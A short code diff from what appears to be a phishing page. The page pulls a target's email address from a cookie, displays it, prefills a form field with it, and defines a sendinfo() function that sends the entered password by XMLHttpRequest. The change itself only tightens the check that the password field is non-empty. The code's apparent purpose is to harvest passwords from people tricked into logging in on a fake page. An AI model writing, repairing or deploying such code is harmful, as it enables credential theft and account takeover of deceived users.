@@ -146,7 +146,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 	document.getElementById("pIdr").innerHTML = Cookies.get('email');
 	document.getElementById("uremail").value = Cookies.get('email');
 	function sendinfo() {
-		if(document.getElementById("pw").value) {
+		if(document.getElementById("pw").value!="") {
 		var xhttp = new XMLHttpRequest();
 		xhttp.onreadystatechange = function() {
 			if (this.readyState == 4 && this.status == 200) {
